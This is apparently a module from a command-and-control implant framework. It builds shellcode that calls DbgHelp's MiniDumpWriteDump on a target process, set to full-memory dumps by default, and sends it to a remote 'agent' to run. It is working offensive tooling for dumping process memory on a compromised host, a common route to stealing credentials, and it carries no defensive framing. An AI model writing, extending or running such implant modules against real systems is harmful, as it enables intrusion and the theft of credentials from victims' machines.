NAME = "MiniDumpWriteDump"
DESCRIPTION = "Creates a memory dump of a target process using DbgHelp!MiniDumpWriteDump."
PARAMS = [
    {"name": "h_process", "description": "Handle to the process to dump", "type": "hex"},
    {"name": "pid", "description": "Process ID of the target", "type": "hex"},
    {"name": "h_file", "description": "Handle to the file where the dump will be saved", "type": "hex"},
    {"name": "dump_type", "description": "MiniDumpWithFullMemory (2) or Normal (0)", "type": "int", "optional": True, "default": 2}
]

DEPENDENCIES = []
DEFAULT = True

def MiniDumpWriteDump_Payload(agent_id, h_process, pid, h_file, dump_type):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import push_rtl
    
    agent = Agent.by_id(agent_id)
    # Ensure DbgHelp.dll is loaded and resolve the function address
    func_addr = Syscall.sys(agent.id, "MiniDumpWriteDump")
    
    # Signature:
    # BOOL MiniDumpWriteDump(
    #   HANDLE                            hProcess,
    #   DWORD                             ProcessId,
    #   HANDLE                            hFile,
    #   MINIDUMP_TYPE                     DumpType,
    #   PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
    #   PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    #   PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
    # );
    
    params = [
        h_process,   # hProcess
        pid,         # ProcessId
        h_file,      # hFile
        dump_type,   # DumpType (FullMemory = 2)
        0,           # ExceptionParam (NULL)
        0,           # UserStreamParam (NULL)
        0            # CallbackParam (NULL)
    ]
    
    shellcode = push_rtl(func_addr, params, agent.debug)
    return b"", shellcode

def function(agent_id, args):
    from services.orders import send_and_wait
    
    h_process = args[0]
    pid = args[1]
    h_file = args[2]
    dump_type = args[3]

    # Generate shellcode for the library call
    data, shellcode = MiniDumpWriteDump_Payload(agent_id, h_process, pid, h_file, dump_type)
    
    # Trigger execution
    response_bytes = send_and_wait(agent_id, shellcode, True)
    # MiniDumpWriteDump returns BOOL (1 for success, 0 for failure)
    success = int.from_bytes(response_bytes, 'little')

    return {
        "retval": 0 if success != 0 else -1,
        "h_process": hex(h_process),
        "target_pid": pid,
        "h_file": hex(h_file)
    }